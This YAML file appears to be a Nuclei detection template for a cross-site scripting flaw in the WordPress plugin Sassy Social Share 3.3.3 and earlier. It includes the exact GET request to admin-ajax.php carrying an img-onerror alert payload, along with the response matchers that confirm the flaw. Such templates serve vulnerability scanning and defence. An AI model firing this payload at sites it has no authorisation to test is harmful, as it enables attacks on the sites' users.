http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '[{"<img src=x onerror=alert(document.domain)>":""}]'
    - facebook
    - twitter
  - negative: true
    part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-admin/admin-ajax.php?action=heateor_sss_sharing_count&urls[%3Cimg%20src%3dx%20onerror%3dalert(document.domain)%3E]='
id: sassy-social-share-xss
info:
  author: Random_Robbie
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-80
  description: 'WordPress Sassy Social Share 3.3.3 and prior is vulnerable to cross-site
    scripting because certain AJAX endpoints return JSON data with no Content-Type
    header set and then use the default text/html. In other words, any JSON that has
    HTML will be rendered as such.

    '
  metadata:
    max-request: 1
  name: Sassy Social Share <=3.3.3 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/4631519b-2060-43a0-b69b-b3d7ed94c705
  severity: medium
  tags: xss,wp,wpscan,wordpress,wp-plugin,sassy,vuln
